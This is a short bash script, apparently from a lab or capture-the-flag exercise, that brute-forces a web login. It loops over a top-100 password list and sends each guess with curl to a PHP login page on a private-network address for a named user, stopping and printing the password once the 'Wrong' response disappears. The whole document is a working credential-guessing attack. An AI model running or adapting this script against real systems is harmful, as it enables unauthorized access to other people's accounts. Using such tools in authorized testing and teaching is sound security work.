#!/bin/bash

input="top100passwords.txt"

while read -r line
do
if curl --silent "192.168.3.151/index.php?username=furkan.paligu&password=${line}" | grep "Wrong"; then
continue;
else
echo "The Password is: "
echo $line
break;
fi
done < $input
